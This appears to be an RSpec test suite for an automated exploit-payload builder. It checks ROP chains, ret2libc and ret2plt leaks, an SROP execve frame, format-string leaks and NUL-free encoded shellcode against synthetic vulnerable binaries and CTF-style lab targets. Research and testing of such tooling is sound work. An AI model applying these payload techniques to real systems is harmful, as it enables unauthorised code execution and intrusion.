# frozen_string_literal: true

require "lictor"
require "tmpdir"

builder = ["../../augure/profiler/spec/support/binary_builder.rb",
  "../augure/profiler/spec/support/binary_builder.rb"]
  .map { |p| File.expand_path(p, __dir__) }
  .find { |p| File.file?(p) }
require_relative builder

RSpec.describe Lictor::PayloadBuilder do
  let(:dir) { Dir.mktmpdir }
  let(:binary) { ProfilerBinaryBuilder.vulnerable }
  let(:out) { File.join(dir, "payload.bin") }

  it "builds the ret2func payload: measured padding + ret_align + the win address" do
    facts = "nx(\"true\").\npie(\"false\").\nwin_symbol(\"win\", 4196182).\n" \
            "gadget(\"ret_align\", 4196100).\n"
    result = described_class.build(binary: binary, facts: facts, technique: "ret2func", out: out)
    expect(result[:offset]).to eq(16)
    expect(result[:offset_source]).to eq("static-frame")
    expect(result[:sink]).to eq("strcpy")
    expect(result[:ret_source]).to include("win_symbol:win")
    body = File.binread(out)
    expect(body).not_to include([4_196_100].pack("Q<")) # offset 16: already aligned, no gadget
    expect(body).to eq(("A" * 16).b + [4_196_182].pack("Q<"))
  end

  it "resolves sym:NAME+offset: the syscall tail behind a symbol" do
    facts = "sym_addr(\"sigreturn_gadget\", 4198846).\n"
    result = described_class.build(binary: binary, facts: facts, technique: "srop_probe",
      out: out, packs: [double(build: {"technique" => "srop_probe",
                                       "layout" => [[
                                         "chain", "sym:sigreturn_gadget+7"
                                       ]]})])
    body = File.binread(out)
    expect(body).to eq([4_198_853].pack("Q<"))
    expect(result[:ret_source]).to include("sym_addr:sigreturn_gadget+7")
  end

  it "resolves gadget:TYPE+offset: the syscall tail behind the matched bytes" do
    facts = "gadget(\"sigreturn\", 4198846).\n"
    result = described_class.build(binary: binary, facts: facts, technique: "srop_probe",
      out: out, packs: [double(build: {"technique" => "srop_probe",
                                       "layout" => [[
                                         "chain", "gadget:sigreturn+7"
                                       ]]})])
    body = File.binread(out)
    expect(body).to eq([4_198_853].pack("Q<"))
    expect(result[:ret_source]).to include("gadget:sigreturn+7")
  end

  it "builds the ret2libc leak stage when no leak facts ride yet" do
    # the two-stage shape: without leaked facts the builder emits the
    # leak round (puts(GOT[puts]) rides out raw) - the strike derives
    # from what answers
    facts = "vuln(\"sof\").\nnx(\"true\").\npie(\"true\").\n" \
            "gadget(\"ret_align\", 4122).\ngadget(\"pop_rdi_ret\", 4529).\n" \
            "plt_addr(\"puts\", 4215).\ngot_addr(\"puts\", 4096).\n"
    result = described_class.build(binary: binary, facts: facts, technique: "ret2libc", out: out)
    body = File.binread(out)
    expect(body).to start_with("A" * 16)
    expect(body).to include([4529].pack("Q<") + [4096].pack("Q<") + [4215].pack("Q<"))
    expect(result[:variant]).to eq("leak_stage")
  end

  it "builds the fmtstr leak format off the fmt_offset fact - no measured offset" do
    # the fmtstr class has no return-slot padding to measure: the leak
    # format string comes straight from the profiler's fmt_offset
    bin = ProfilerBinaryBuilder.printf_stack
    facts = "vuln(\"fmtstr\").\nfmtstr_read(\"true\").\nfmt_offset(\"6\").\n"
    result = described_class.build(binary: bin, facts: facts, technique: "fmtstr_leak", out: out)
    body = File.binread(out)
    expect(body).to start_with("%6$p %7$p")
    expect(body).to end_with("|")
    expect(result[:offset]).to be_nil
  end

  it "builds the shellcode payload: sled + the banner leak + the encoded stub" do
    facts = "nx(\"false\").\nleaked_address(\"buf\", 140730103547632).\n"
    result = described_class.build(binary: binary, facts: facts, technique: "shellcode", out: out)
    expect(result[:ret_source]).to include("leaked_address:buf")
    expect(result[:ret]).to eq(140_730_103_547_632)
    body = File.binread(out)
    expect(body).to start_with(("\x90" * result[:offset]).b)
    expect(body.bytesize).to be > result[:offset] + 8
    expect(result[:size]).to eq(body.bytesize)
    # the shellcode travels through a strcpy: everything AFTER the
    # return slot (the decoder + the encoded stub) must cross the
    # channel NUL-free - a NUL there ends the copy before the payload
    after_ret = body[(result[:offset] + 8)..]
    expect(after_ret).not_to include("\x00".b)
  end

  it "encodes a custom payload file so it crosses the strcpy channel" do
    custom = File.join(dir, "custom.sc")
    File.binwrite(custom, "\xcc" * 11)
    facts = "leaked_address(\"buf\", 99).\n"
    described_class.build(binary: binary, facts: facts, technique: "shellcode",
      out: out, payload_file: custom)
    body = File.binread(out)
    # the raw 0xcc bytes carry no NUL, but the channel rule is uniform:
    # the body after the return slot is the ENCODED form (the decoder +
    # the keyed data), NUL-free whatever the input contained
    after_ret = body[result_offset(body) + 8..]
    expect(after_ret).not_to include("\x00".b)
  end

  def result_offset(body)
    # the sled ends where the first non-0x90 byte sits (the gadget's
    # qword); the tests build a 0x90 sled of the measured offset
    body.bytes.index { |b| b != 0x90 } || 0
  end

  it "refuses honestly when the facts cannot drive the template" do
    expect do
      described_class.build(binary: binary, facts: "nx(\"true\").\n", technique: "ret2func", out: out)
    end.to raise_error(Lictor::PayloadBuilder::BuildError, /win_symbol/)
    expect do
      described_class.build(binary: binary, facts: "nx(\"true\").\n", technique: "heap_tcache", out: out)
    end.to raise_error(Lictor::PayloadBuilder::BuildError, /layout/)
  end
end

RSpec.describe "the leaked-address slot" do
  let(:pb) { Lictor::PayloadBuilder }
  let(:dir) { Dir.mktmpdir }
  let(:binary) do
    builder = ["../../augure/profiler/spec/support/binary_builder.rb",
      "../augure/profiler/spec/support/binary_builder.rb"]
      .map { |p| File.expand_path(p, __dir__) }
      .find { |p| File.file?(p) }
    require_relative builder
    ProfilerBinaryBuilder.vulnerable
  end
  let(:out) { File.join(dir, "payload.bin") }

  it "builds from the addresses the service leaked" do
    facts = "nx(\"true\").\npie(\"false\").\ncanary(\"false\").\n" \
            "leaked_address(\"win\", 4196182).\n"
    result = pb.build(binary: binary, facts: facts, technique: "banner_leak", out: out)
    expect(result[:ret_source]).to include("leaked_address:win@4196182")
    expect(File.binread(out)).to eq(("A" * 16).b + [4_196_182].pack("Q<"))
  end

  it "refuses when the service never leaked" do
    facts = "nx(\"true\").\n"
    expect do
      pb.build(binary: binary, facts: facts, technique: "banner_leak", out: out)
    end.to raise_error(Lictor::PayloadBuilder::BuildError, /harvest/)
  end
end

RSpec.describe "the pack build: section" do
  let(:dir) { Dir.mktmpdir }
  let(:binary) { ProfilerBinaryBuilder.vulnerable }

  it "a pack technique builds with ITS layout: gadget chain then win" do
    out = File.join(dir, "p.bin")
    facts = "nx(\"true\").\npie(\"false\").\nwin_symbol(\"win\", 4196182).\ngadget(\"ret_align\", 4196100).\n"
    pack = Augure::Pack.load_hash(
      "technique" => "chain_probe", "author" => "spec", "source" => "https://example.com",
      "rules" => [{"id" => "app_chain_probe", "head" => %w[applicable chain_probe],
                   "conditions" => [%w[fact target_function true]]}],
      "kb" => [{"id" => "x1", "description" => "x", "success_rate" => 0.5}],
      "mcts" => {"requires" => [], "provides" => %w[shell], "terminal" => true, "success" => 0.5},
      "priors" => [1, 1],
      "build" => {"technique" => "chain_probe",
                  "layout" => [["padding"], ["qword", "gadget:ret_align"], ["qword", "win"]]}
    )
    result = Lictor::PayloadBuilder.build(binary: binary, facts: facts,
      technique: "chain_probe", out: out, packs: [pack])
    body = File.binread(out)
    expect(body).to eq(("A" * 16).b + [4_196_100].pack("Q<") + [4_196_182].pack("Q<"))
    expect(result[:ret_source]).to include("gadget:ret_align")
  end

  it "a pack teaching a NEW technique gets its layout from the pack" do
    out = File.join(dir, "n.bin")
    facts = "nx(\"true\").\npie(\"false\").\nwin_symbol(\"win\", 4196182).\n"
    pack = Augure::Pack.load_hash(
      "technique" => "fancy_probe", "author" => "spec", "source" => "https://example.com",
      "rules" => [{"id" => "app_fancy", "head" => %w[applicable fancy_probe],
                   "conditions" => [%w[fact target_function true]]}],
      "kb" => [{"id" => "f1", "description" => "f", "success_rate" => 0.5}],
      "mcts" => {"requires" => [], "provides" => %w[shell], "terminal" => true, "success" => 0.5},
      "priors" => [1, 1],
      "build" => {"technique" => "fancy_probe",
                  "layout" => [["padding"], %w[dword win]]}
    )
    Lictor::PayloadBuilder.build(binary: binary, facts: facts,
      technique: "fancy_probe", out: out, packs: [pack])
    # the dword slot is 4 bytes wide even on x64 (the width per slot)
    expect(File.binread(out)).to eq(("A" * 16).b + [4_196_182].pack("L<"))
  end

  it "truncates the word slot to the low 16 bits (the PIE page hop)" do
    out = File.join(dir, "w.bin")
    facts = "nx(\"true\").\npie(\"true\").\nwin_symbol(\"win\", 4196182).\n"
    pack = Augure::Pack.load_hash(
      "technique" => "fancy_hop", "author" => "spec", "source" => "https://example.com",
      "rules" => [{"id" => "app_fancy", "head" => %w[applicable fancy_hop],
                   "conditions" => [%w[fact target_function true]]}],
      "kb" => [{"id" => "f1", "description" => "f", "success_rate" => 0.5}],
      "mcts" => {"requires" => [], "provides" => %w[shell], "terminal" => true, "success" => 0.5},
      "priors" => [1, 1],
      "build" => {"technique" => "fancy_hop",
                  "layout" => [["padding"], %w[word win]]}
    )
    Lictor::PayloadBuilder.build(binary: binary, facts: facts,
      technique: "fancy_hop", out: out, packs: [pack])
    # the word slot is 2 bytes wide: the low 16 bits only (the saved
    # RIP's high bytes stay original - the page hop)
    expect(File.binread(out)).to eq(("A" * 16).b + [4_196_182].pack("S<"))
  end
end

RSpec.describe Lictor::PayloadBuilder, "the chain slot" do
  let(:dir) { Dir.mktmpdir }
  let(:binary) { ProfilerBinaryBuilder.vulnerable }

  it "composes the ret2plt leak chain from the facts (gadget, got, plt)" do
    out = File.join(dir, "p.bin")
    facts = "nx(\"true\").\npie(\"false\").\ngadget(\"pop_rdi_ret\", 4196100).\n" \
            "plt_addr(\"puts\", 4196104).\ngot_addr(\"puts\", 4196112).\n"
    result = described_class.build(binary: binary, facts: facts, technique: "ret2plt", out: out)
    body = File.binread(out)
    expected = ("A" * 16).b + [4_196_100, 4_196_112, 4_196_104].pack("Q<*")
    expect(body).to eq(expected)
    expect(result[:ret_source]).to include("gadget:pop_rdi_ret")
  end

  it "resolves const literals and refuses incomplete chains loudly" do
    out = File.join(dir, "c.bin")
    facts = "nx(\"true\").\npie(\"false\").\ngadget(\"pop_rdi_ret\", 4196100).\n" \
            "plt_addr(\"puts\", 4196104).\ngot_addr(\"puts\", 4196112).\n"
    pack = Augure::Pack.load_hash(
      "technique" => "chain_const_probe", "author" => "spec", "source" => "https://example.com",
      "rules" => [{"id" => "app_ccp", "head" => %w[applicable chain_const_probe],
                   "conditions" => [%w[fact nx true]]}],
      "kb" => [{"id" => "c1", "description" => "c", "success_rate" => 0.5}],
      "mcts" => {"requires" => [], "provides" => %w[shell], "terminal" => true, "success" => 0.5},
      "priors" => [1, 1],
      "build" => {"technique" => "chain_const_probe",
                  "layout" => [["padding"], ["chain", "gadget:pop_rdi_ret", "const:59", "plt_addr:puts"]]}
    )
    described_class.build(binary: binary, facts: facts, technique: "chain_const_probe", out: out, packs: [pack])
    body = File.binread(out)
    expect(body).to eq(("A" * 16).b + [4_196_100, 59, 4_196_104].pack("Q<*"))
  end

  it "refuses a chain whose gadget is not in the facts" do
    out = File.join(dir, "f.bin")
    facts = "nx(\"true\").\npie(\"false\").\ngadget(\"pop_rsi_ret\", 4196100).\n"
    expect do
      described_class.build(binary: binary, facts: facts, technique: "ret2plt", out: out)
    end.to raise_error(Lictor::PayloadBuilder::BuildError, /pop_rdi_ret/)
  end
end

RSpec.describe Lictor::PayloadBuilder, "the NUL-terminated channel" do
  let(:dir) { Dir.mktmpdir }
  let(:binary) { ProfilerBinaryBuilder.vulnerable }
  let(:out) { File.join(dir, "p.bin") }

  # the strcpy channel stops at the first NUL: a chain qword carrying a
  # NUL byte truncates the copy BEFORE the rest of the chain lands -
  # the middle qwords must ride NUL-free, the last may be partial (the
  # stack keeps the high bytes). The bounded channels (read/fgets/...)
  # copy the exact count: NULs ride whole.
  it "refuses a chain whose middle qword carries a NUL on a strcpy channel" do
    # the first qword rides NUL-free (the copy continues into the rest
    # of the chain), so the error names the middle qword
    facts = "sink(\"strcpy\").\nnx(\"true\").\npie(\"false\").\n" \
            "gadget(\"pop_rdi_ret\", 4702111234474983745).\n" \
            "plt_addr(\"puts\", 4196104).\ngot_addr(\"puts\", 4196112).\n"
    expect do
      described_class.build(binary: binary, facts: facts, technique: "ret2plt", out: out)
    end.to raise_error(Lictor::PayloadBuilder::BuildError,
      /got_addr:puts.*NUL.*strcpy.*stops the copy/m)
  end

  it "builds the same chain on a bounded channel: NULs ride the copy" do
    facts = "sink(\"read\").\nnx(\"true\").\npie(\"false\").\n" \
            "gadget(\"pop_rdi_ret\", 4196100).\n" \
            "plt_addr(\"puts\", 4196104).\ngot_addr(\"puts\", 4196112).\n"
    result = described_class.build(binary: binary, facts: facts, technique: "ret2plt", out: out)
    expect(File.binread(out)).to eq(("A" * 16).b + [4_196_100, 4_196_112, 4_196_104].pack("Q<*"))
    expect(result[:ret_source]).to include("gadget:pop_rdi_ret")
  end

  it "lets the last chain qword ride partial: the stack keeps the high bytes" do
    # the last qword is the final return address: its trailing NULs are
    # the stack's own bytes - the copy may stop there, nothing follows.
    # the first qword must ride NUL-free: the copy continues into the
    # next qword, so the synthetic address is 0x41-filled (no NUL)
    facts = "sink(\"strcpy\").\nnx(\"true\").\npie(\"false\").\n" \
            "gadget(\"pop_rdi_ret\", 4702111234474983745).\n" \
            "plt_addr(\"puts\", 4196104).\n"
    pack = Augure::Pack.load_hash(
      "technique" => "last_qword_probe", "author" => "spec", "source" => "https://example.com",
      "rules" => [{"id" => "app_lqp", "head" => %w[applicable last_qword_probe],
                   "conditions" => [%w[fact nx true]]}],
      "kb" => [{"id" => "l1", "description" => "l", "success_rate" => 0.5}],
      "mcts" => {"requires" => [], "provides" => %w[shell], "terminal" => true, "success" => 0.5},
      "priors" => [1, 1],
      "build" => {"technique" => "last_qword_probe",
                  "layout" => [["padding"], ["chain", "gadget:pop_rdi_ret", "plt_addr:puts"]]}
    )
    result = described_class.build(binary: binary, facts: facts, technique: "last_qword_probe",
      out: out, packs: [pack])
    expect(File.binread(out)).to eq(("A" * 16).b + [4_702_111_234_474_983_745, 4_196_104].pack("Q<*"))
    expect(result[:ret_source]).to include("gadget:pop_rdi_ret")
  end

  it "refuses a last chain qword whose NUL is not at the top" do
    # 0x40001234: a NUL at byte 2, followed by 0x40 - the partial
    # overwrite would land 0x401234, not the intended value. the first
    # qword rides NUL-free so the error names the last qword
    facts = "sink(\"strcpy\").\nnx(\"true\").\npie(\"false\").\n" \
            "gadget(\"pop_rdi_ret\", 4702111234474983745).\n" \
            "plt_addr(\"puts\", 4196104).\n"
    pack = Augure::Pack.load_hash(
      "technique" => "mid_nul_probe", "author" => "spec", "source" => "https://example.com",
      "rules" => [{"id" => "app_mnp", "head" => %w[applicable mid_nul_probe],
                   "conditions" => [%w[fact nx true]]}],
      "kb" => [{"id" => "m1", "description" => "m", "success_rate" => 0.5}],
      "mcts" => {"requires" => [], "provides" => %w[shell], "terminal" => true, "success" => 0.5},
      "priors" => [1, 1],
      "build" => {"technique" => "mid_nul_probe",
                  "layout" => [["padding"], ["chain", "gadget:pop_rdi_ret", "const:1073747252"]]}
    )
    expect do
      described_class.build(binary: binary, facts: facts, technique: "mid_nul_probe",
        out: out, packs: [pack])
    end.to raise_error(Lictor::PayloadBuilder::BuildError, /const:1073747252.*NUL/m)
  end

  it "leaves the chains unchecked when the facts carry no sink" do
    # the old contracts: the facts do not name the channel, the builder
    # builds (the sink fact is the profiler's emission, not the builder's guess)
    facts = "nx(\"true\").\npie(\"false\").\ngadget(\"pop_rdi_ret\", 4196100).\n" \
            "plt_addr(\"puts\", 4196104).\ngot_addr(\"puts\", 4196112).\n"
    described_class.build(binary: binary, facts: facts, technique: "ret2plt", out: out)
    expect(File.binread(out)).to eq(("A" * 16).b + [4_196_100, 4_196_112, 4_196_104].pack("Q<*"))
  end
end

RSpec.describe Lictor::PayloadBuilder, "the orw shellcode slot" do
  let(:dir) { Dir.mktmpdir }
  let(:binary) { ProfilerBinaryBuilder.vulnerable }

  it "an orw slot carries its flag path and reads it live" do
    out = File.join(dir, "p.bin")
    facts = "nx(\"false\").\nleaked_address(\"input\", 4196300).\n"
    # the override and the slot default must differ: the builder's
    # shellcode_path wins, the slot's flag.txt stays the fallback (the
    # old spec masked the precedence: its flag.txt WAS the override)
    flag = File.join(dir, "real.flag")
    File.write(flag, "FLAG{orw_slot}")
    result = described_class.build(binary: binary, facts: facts, technique: "orw",
      out: out, shellcode_path: flag)
    body = File.binread(out)
    # the path rides ENCODED (the strcpy channel): the body after the
    # return slot must cross it NUL-free; the live runner below proves
    # the decoded stub reads the flag
    after_ret = body[(result[:offset] + 8)..]
    expect(after_ret).not_to include("\x00".b)
    expect(result[:ret_source]).to include("leaked_address:input@4196300")
    # live: run the stub, it prints the flag
    runner = File.join(dir, "sc_runner")
    src = ["../../augure/profiler/spec/support/sc_runner.c",
      "../augure/profiler/spec/support/sc_runner.c"]
      .map { |p| File.expand_path(p, __dir__) }
      .find { |p| File.file?(p) }
    skip "the augure checkout is not present" unless src
    _o, err, st = Open3.capture3("gcc", "-o", runner, src)
    raise "runner build failed: #{err}" unless st.success?

    code = body[(result[:offset] + 8)..] # after the sled + the leak address
    out2, _e2, st2 = Open3.capture3(runner, stdin_data: code + "\nexit\n", chdir: dir)
    expect(out2).to include("FLAG{orw_slot}"), "the orw stub ran: #{out2[0, 80]}"
    expect(st2.success?).to be(true)
  end
end

RSpec.describe Lictor::PayloadBuilder, "seccomp-aware shellcode" do
  let(:dir) { Dir.mktmpdir }
  let(:binary) { ProfilerBinaryBuilder.vulnerable }

  it "execve dies under seccomp: the sh stub becomes the orw chain" do
    out = File.join(dir, "p.bin")
    facts = "nx(\"false\").\nseccomp(\"true\").\nleaked_address(\"buf\", 140730103547632).\n"
    result = described_class.build(binary: binary, facts: facts, technique: "shellcode", out: out)
    body = File.binread(out)
    # the executed region starts at ret_slot+8 (the decode lands right
    # after the return slot): that region must cross the strcpy channel
    # NUL-free; the return slot's own NULs are completed by the original
    # stack
    after_ret = body[(result[:offset] + 8)..]
    expect(body).not_to include("/bin/sh"), "the sh stub execve's into a killed process under seccomp"
    expect(after_ret).not_to include("\x00".b), "the orw stub crosses the strcpy channel NUL-free"
  end
end

RSpec.describe Lictor::PayloadBuilder, "an explicit --technique override" do
  let(:dir) { Dir.mktmpdir }
  let(:binary) { ProfilerBinaryBuilder.vulnerable }

  it "builds the overridden technique's layout, not the bandit's draw" do
    out = File.join(dir, "p.bin")
    # the facts draw shellcode AND ret2func: the override forces ret2func
    facts = "nx(\"false\").\ngadget(\"jmp_rsp\", 4196200).\nwin_symbol(\"win\", 4198870).\n"
    result = described_class.build(binary: binary, facts: facts, technique: "ret2func",
      out: out)
    expect(result[:ret_source]).to include("win_symbol:win")
  end
end

RSpec.describe Lictor::PayloadBuilder, "the shellcode ret slot without the banner leak" do
  let(:dir) { Dir.mktmpdir }
  let(:binary) { ProfilerBinaryBuilder.vulnerable }

  it "fails loud: the harvest never recorded the buffer address" do
    facts = "nx(\"false\").\n" # no jmp_rsp in this binary either (0 ff e4 hits)
    out = File.join(dir, "p.bin")
    expect { described_class.build(binary: binary, facts: facts, technique: "shellcode", out: out) }
      .to raise_error(Lictor::PayloadBuilder::BuildError, /leaked_address\("buf"\)/)
  end
end

RSpec.describe Lictor::PayloadBuilder, "the sym:NAME reference" do
  let(:dir) { Dir.mktmpdir }
  let(:binary) { ProfilerBinaryBuilder.vulnerable }

  it "resolves a static twin's stage function from its sym_addr fact" do
    out = File.join(dir, "p.bin")
    facts = "nx(\"true\").\npie(\"false\").\nsym_addr(\"vault_arm\", 4199099).\n"
    pack = Augure::Pack.load_hash(
      "technique" => "static_stage_probe", "author" => "spec", "source" => "https://example.com",
      "rules" => [{"id" => "app_ssp", "head" => %w[applicable static_stage_probe],
                   "conditions" => [%w[fact pie false]]}],
      "kb" => [{"id" => "s1", "description" => "s", "success_rate" => 0.5}],
      "mcts" => {"requires" => [], "provides" => %w[shell], "terminal" => true, "success" => 0.5},
      "priors" => [1, 1],
      "build" => {"technique" => "static_stage_probe",
                  "layout" => [["padding"], ["qword", "sym:vault_arm"]]}
    )
    result = described_class.build(binary: binary, facts: facts,
      technique: "static_stage_probe", out: out, packs: [pack])
    expect(File.binread(out)).to eq(("A" * 16).b + [4_199_099].pack("Q<"))
    expect(result[:ret_source]).to eq("sym_addr:vault_arm@4199099")
  end

  it "refuses a symbol the profiler never recorded" do
    out = File.join(dir, "p.bin")
    facts = "nx(\"true\").\npie(\"false\").\nsym_addr(\"probe\", 4199051).\n"
    pack = Augure::Pack.load_hash(
      "technique" => "static_stage_probe", "author" => "spec", "source" => "https://example.com",
      "rules" => [{"id" => "app_ssp", "head" => %w[applicable static_stage_probe],
                   "conditions" => [%w[fact pie false]]}],
      "kb" => [{"id" => "s1", "description" => "s", "success_rate" => 0.5}],
      "mcts" => {"requires" => [], "provides" => %w[shell], "terminal" => true, "success" => 0.5},
      "priors" => [1, 1],
      "build" => {"technique" => "static_stage_probe",
                  "layout" => [["padding"], ["qword", "sym:vault_arm"]]}
    )
    expect do
      described_class.build(binary: binary, facts: facts,
        technique: "static_stage_probe", out: out, packs: [pack])
    end.to raise_error(Lictor::PayloadBuilder::BuildError, /sym_addr\("vault_arm"\)/)
  end
end

RSpec.describe Lictor::PayloadBuilder, "the layout variants walk" do
  let(:dir) { Dir.mktmpdir }
  let(:binary) { ProfilerBinaryBuilder.vulnerable }

  def variant_pack(technique, variants)
    Augure::Pack.load_hash(
      "technique" => technique, "author" => "spec", "source" => "https://example.com",
      "rules" => [{"id" => "app_#{technique}", "head" => ["applicable", technique],
                   "conditions" => [%w[fact pie false]]}],
      "kb" => [{"id" => "v1", "description" => "v", "success_rate" => 0.5}],
      "mcts" => {"requires" => [], "provides" => %w[shell], "terminal" => true, "success" => 0.5},
      "priors" => [1, 1],
      "build" => {"technique" => technique, "variants" => variants}
    )
  end

  it "builds with the first variant whose references the facts satisfy" do
    out = File.join(dir, "p.bin")
    facts = "nx(\"true\").\npie(\"false\").\n" \
            "gadget(\"pop_rdi_rsi_rdx_ret\", 4198998).\nsym_addr(\"vault_arm\", 4199099).\n"
    pack = variant_pack("twin_probe", [
      {"name" => "plt_csu",
       "layout" => [["padding"], ["chain", "gadget:pop_rdi_ret", "plt_addr:callme_one"]]},
      {"name" => "static_stages",
       "layout" => [["padding"],
         ["chain", "gadget:pop_rdi_rsi_rdx_ret", "sym:vault_arm", "const:41"]]}
    ])
    result = described_class.build(binary: binary, facts: facts,
      technique: "twin_probe", out: out, packs: [pack])
    expect(result[:variant]).to eq("static_stages")
    expect(File.binread(out)).to eq(("A" * 16).b + [4_198_998, 4_199_099, 41].pack("Q<*"))
  end

  it "names every variant and its reason when none matches the facts" do
    out = File.join(dir, "p.bin")
    facts = "nx(\"true\").\npie(\"false\").\nwin_symbol(\"win\", 4196182).\n"
    pack = variant_pack("twin_probe", [
      {"name" => "plt_csu",
       "layout" => [["padding"], ["chain", "gadget:pop_rdi_ret", "plt_addr:callme_one"]]},
      {"name" => "static_stages",
       "layout" => [["padding"], ["chain", "gadget:pop_rdi_rsi_rdx_ret", "sym:vault_arm"]]}
    ])
    expect do
      described_class.build(binary: binary, facts: facts,
        technique: "twin_probe", out: out, packs: [pack])
    end.to raise_error(Lictor::PayloadBuilder::BuildError,
      /plt_csu: .*pop_rdi_ret.*static_stages: .*pop_rdi_rsi_rdx_ret/m)
  end
end

# the real augure pack layouts (the eval2 twins, the orw variants):
# exercised here against the synthetic binary, not only against the
# live lab targets - the packs ARE the contract
RSpec.describe Lictor::PayloadBuilder, "the real augure pack layouts" do
  let(:dir) { Dir.mktmpdir }
  let(:binary) { ProfilerBinaryBuilder.vulnerable }
  let(:out) { File.join(dir, "payload.bin") }

  def real_pack(name)
    packs_dir = ["../../augure/packs", "../augure/packs"]
      .map { |p| File.expand_path(p, __dir__) }
      .find { |p| File.directory?(p) }
    Augure::PackLoader.load_file(File.join(packs_dir, "#{name}.yml"))
  end

  it "builds the srop_eval2 frame: sigreturn gadget + the full ucontext" do
    facts = "vuln(\"sof\").\nnx(\"true\").\npie(\"false\").\n" \
            "gadget(\"sigreturn\", 4198846).\nsym_addr(\"sh_cmd\", 4196182).\n"
    result = described_class.build(binary: binary, facts: facts,
      technique: "srop_eval2", out: out, packs: [real_pack("srop_eval2")])
    body = File.binread(out)
    zero = [0].pack("Q<")
    # the frame: sigreturn gadget, then the 13 uc-prefix zeros (5 unread
    # + R8..R15), RDI=sh_cmd, RSI/RBP/RBX/RDX zero, RAX=59 (execve),
    # RCX/RSP zero, RIP=the syscall tail (sym+7), EFL 0x202, CSGSFS
    # 0x33, then ERR/TRAPNO/OLDMASK/CR2 and the 8 reserved words
    expect(body).to eq(
      ("A" * 16).b + [4_198_846].pack("Q<") +
      zero * 13 + [4_196_182].pack("Q<") + zero * 4 +
      [59].pack("Q<") + zero * 2 +
      [4_198_853].pack("Q<") +
      [514, 51].pack("Q<2") + zero * 13
    )
    expect(result[:ret_source]).to include("gadget:sigreturn@4198846")
  end

  it "builds the callme_eval2 vault chain: three pop3 stages" do
    facts = "vuln(\"sof\").\ngadget(\"pop_rdi_rsi_rdx_ret\", 4198846).\n" \
            "sym_addr(\"vault_arm\", 4196100).\nsym_addr(\"vault_fire\", 4196200).\n" \
            "sym_addr(\"vault_open\", 4196300).\n"
    result = described_class.build(binary: binary, facts: facts,
      technique: "callme_eval2", out: out, packs: [real_pack("callme_eval2")])
    pop3 = [4_198_846].pack("Q<")
    stage = lambda do |magic_base, sym|
      pop3 + [magic_base, magic_base + 1, magic_base + 2].pack("Q<3") + [sym].pack("Q<")
    end
    expect(File.binread(out)).to eq(
      ("A" * 16).b + stage.call(2_712_845_057, 4_196_100) +
        stage.call(2_712_845_060, 4_196_200) + stage.call(2_712_845_063, 4_196_300)
    )
    expect(result[:ret_source]).to include("gadget:pop_rdi_rsi_rdx_ret@4198846")
  end

  it "builds the ret2plt_eval2 chain: ret_align + pop_rdi + system@plt" do
    facts = "vuln(\"sof\").\ngadget(\"ret_align\", 4196100).\n" \
            "gadget(\"pop_rdi_ret\", 4196101).\nplt_addr(\"system\", 4196200).\n" \
            "sym_addr(\"arg_cmd\", 4196182).\n"
    result = described_class.build(binary: binary, facts: facts,
      technique: "ret2plt_eval2", out: out, packs: [real_pack("ret2plt_eval2")])
    expect(File.binread(out)).to eq(
      ("A" * 16).b + [4_196_100, 4_196_101, 4_196_182, 4_196_200].pack("Q<4")
    )
    expect(result[:ret_source]).to include("gadget:ret_align@4196100")
  end

  it "builds the orw rop variant: openat/read/write syscall chain" do
    facts = "vuln(\"sof\").\n" \
            "gadget(\"pop_rax_ret\", 4196100).\ngadget(\"pop_rdi_ret\", 4196101).\n" \
            "gadget(\"pop_rsi_ret\", 4196102).\ngadget(\"pop_rdx_ret\", 4196103).\n" \
            "gadget(\"syscall_ret\", 4196104).\n" \
            "sym_addr(\"flag_path\", 4196182).\nsym_addr(\"out_buf\", 4196183).\n"
    result = described_class.build(binary: binary, facts: facts,
      technique: "orw", out: out, packs: [real_pack("orw")])
    expect(result[:variant]).to eq("rop")
    # the chain: 3 syscalls (openat/read/write), each 6 gadget pairs + syscall_ret
    at_fdcwd = [18_446_744_073_709_551_516].pack("Q<")
    q = ->(v) { [v].pack("Q<") }
    expect(File.binread(out)).to eq(
      ("A" * 16).b +
      q.call(4_196_100) + q.call(257) + q.call(4_196_101) + at_fdcwd + q.call(4_196_102) + q.call(4_196_182) +
      q.call(4_196_103) + q.call(0) + q.call(4_196_104) +
      q.call(4_196_100) + q.call(0) + q.call(4_196_101) + q.call(3) + q.call(4_196_102) + q.call(4_196_183) +
      q.call(4_196_103) + q.call(256) + q.call(4_196_104) +
      q.call(4_196_100) + q.call(1) + q.call(4_196_101) + q.call(1) + q.call(4_196_102) + q.call(4_196_183) +
      q.call(4_196_103) + q.call(256) + q.call(4_196_104)
    )
    expect(result[:ret_source]).to include("gadget:pop_rax_ret@4196100")
  end

  it "builds the orw stack variant from the harvest leak when the gadgets are absent" do
    custom = File.join(dir, "sc.bin")
    File.binwrite(custom, "\xcc" * 10) # the stub: the encoder keeps it NUL-free
    facts = "vuln(\"sof\").\nnx(\"false\").\nseccomp(\"true\").\n" \
            "leaked_address(\"input\", 140730103547632).\n"
    result = described_class.build(binary: binary, facts: facts,
      technique: "orw", out: out, packs: [real_pack("orw")], payload_file: custom)
    expect(result[:variant]).to eq("stack")
    body = File.binread(out)
    expect(body).to start_with(("\x90" * result[:offset]).b)
    expect(body).to include([140_730_103_547_632].pack("Q<"))
  end
end
